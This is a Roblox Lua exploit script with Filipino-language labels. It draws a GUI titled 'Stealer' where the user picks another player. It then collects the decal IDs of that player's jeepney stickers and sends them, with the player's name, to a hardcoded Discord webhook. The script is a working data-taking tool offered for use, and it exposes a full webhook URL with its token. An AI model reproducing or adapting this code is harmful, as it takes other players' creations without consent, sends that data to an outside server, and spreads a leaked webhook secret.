-- BWISET TONG SCRIPT NA TO HAHAHAHAJA
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

local webhookURL = "https://discord.com/api/webhooks/1441426037257801780/8Rx1mxzEHp4RKbn6JaRk_4NTiYwb2HRGhbS34IJ1_ZKc5YhJMKDgo39ccjLqSyrj_j0c"

local screenGui = Instance.new("ScreenGui")
screenGui.Parent = Players.LocalPlayer.PlayerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 180, 0, 140)
frame.Position = UDim2.new(0.5, -90, 0.5, -70)
frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
frame.BackgroundTransparency = 0.3
frame.BorderSizePixel = 2
frame.BorderColor3 = Color3.fromRGB(0, 0, 255)
frame.Parent = screenGui

local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 10)
frameCorner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 20)
title.BackgroundTransparency = 1
title.Text = "Stealer"
title.Font = Enum.Font.SourceSansBold
title.TextSize = 16
title.TextColor3 = Color3.new(1, 1, 1)
title.Parent = frame

local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -10, 0, 25)
dropdownFrame.Position = UDim2.new(0, 5, 0, 30)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
dropdownFrame.Parent = frame

local dropdownCorner = Instance.new("UICorner")
dropdownCorner.CornerRadius = UDim.new(0, 5)
dropdownCorner.Parent = dropdownFrame

local selectedText = Instance.new("TextLabel")
selectedText.Size = UDim2.new(1, -20, 1, 0)
selectedText.Position = UDim2.new(0, 5, 0, 0)
selectedText.BackgroundTransparency = 1
selectedText.Text = "Select Player"
selectedText.TextColor3 = Color3.new(1, 1, 1)
selectedText.Font = Enum.Font.SourceSans
selectedText.TextSize = 14
selectedText.TextXAlignment = Enum.TextXAlignment.Left
selectedText.Parent = dropdownFrame

local dropdownButton = Instance.new("TextButton")
dropdownButton.Size = UDim2.new(0, 20, 1, 0)
dropdownButton.Position = UDim2.new(1, -20, 0, 0)
dropdownButton.BackgroundTransparency = 1
dropdownButton.Text = "▼"
dropdownButton.TextColor3 = Color3.new(1, 1, 1)
dropdownButton.Font = Enum.Font.SourceSansBold
dropdownButton.TextSize = 14
dropdownButton.Parent = dropdownFrame

local listFrame = Instance.new("ScrollingFrame")
listFrame.Size = UDim2.new(1, 0, 0, 100)
listFrame.Position = UDim2.new(0, 0, 0, 55)
listFrame.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
listFrame.BorderSizePixel = 1
listFrame.ScrollBarThickness = 5
listFrame.Visible = false
listFrame.Parent = frame

local listCorner = Instance.new("UICorner")
listCorner.CornerRadius = UDim.new(0, 5)
listCorner.Parent = listFrame

local stealButton = Instance.new("TextButton")
stealButton.Size = UDim2.new(0, 80, 0, 25)
stealButton.Position = UDim2.new(0.5, -40, 1, -35)
stealButton.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
stealButton.TextColor3 = Color3.new(1, 1, 1)
stealButton.Text = "Nakawin"
stealButton.Font = Enum.Font.SourceSansBold
stealButton.TextSize = 14
stealButton.Parent = frame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 5)
buttonCorner.Parent = stealButton

local dragging, dragInput, dragStart, startPos

local function update(input)
    local delta = input.Position - dragStart
    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

frame.InputBegan:Connect(function(input)
    if listFrame.Visible then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then
        update(input)
    end
end)

local function populate()
    listFrame:ClearAllChildren()
    local y = 0
    for _, p in ipairs(Players:GetPlayers()) do
        local b = Instance.new("TextButton")
        b.Size = UDim2.new(1, -10, 0, 25)
        b.Position = UDim2.new(0, 5, 0, y)
        b.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
        b.Text = p.Name
        b.TextColor3 = Color3.new(1, 1, 1)
        b.Font = Enum.Font.SourceSans
        b.TextSize = 14
        b.Parent = listFrame

        local bc = Instance.new("UICorner")
        bc.CornerRadius = UDim.new(0, 5)
        bc.Parent = b

        b.MouseButton1Click:Connect(function()
            selectedText.Text = p.Name
            listFrame.Visible = false
            stealButton.Visible = true
        end)

        y += 30
    end
    listFrame.CanvasSize = UDim2.new(0, 0, 0, y)
end

dropdownButton.MouseButton1Click:Connect(function()
    local open = not listFrame.Visible
    listFrame.Visible = open
    stealButton.Visible = not open
    if open then populate() end
end)

local function SendMessageEMBED(url, embed)
    local data = {embeds = {embed}}
    request({
        Url = url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end

local function playNotifySound()
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://73722479618078"
    sound.Volume = 3
    sound.PlayOnRemove = true
    sound.Parent = game:GetService("SoundService")
    sound:Destroy()
end

stealButton.MouseButton1Click:Connect(function()
    local name = selectedText.Text
    if name == "Select Player" then return end

    local plr = Players:FindFirstChild(name)
    if not plr then return end

    local jeepney = Workspace.Jeepnies:FindFirstChild(plr.Name)
    if not jeepney then return end

    local stickers = jeepney:FindFirstChild("Body")
        and jeepney.Body.Structure
        and jeepney.Body.Structure.Customizables
        and jeepney.Body.Structure.Customizables.Stickers
    
    if not stickers then
        playNotifySound()
        game.StarterGui:SetCore("SendNotification", {
            Title = "Notice",
            Text = "Walang Sticker",
            Duration = 5
        })
        return
    end

    local ids = {}
    for _, folder in ipairs(stickers:GetChildren()) do
        for _, obj in ipairs(folder:GetDescendants()) do
            if obj:IsA("Decal") then
                local id = tostring(obj.Texture):match("%d+")
                if id then table.insert(ids, id) end
            end
        end
    end
    
    if #ids == 0 then
        playNotifySound()
        game.StarterGui:SetCore("SendNotification", {
            Title = "Notice",
            Text = "Walang Sticker",
            Duration = 3
        })
        return
    end
    
    SendMessageEMBED(webhookURL, {
        title = "Nanakaw na Sticker",
        description = "Player: "..name.."\nSticker IDs:\n"..table.concat(ids, "\n"),
        color = 16711680,
        footer = {text = "Cassy | "..os.date("%Y-%m-%d %H:%M:%S")}
    })
end)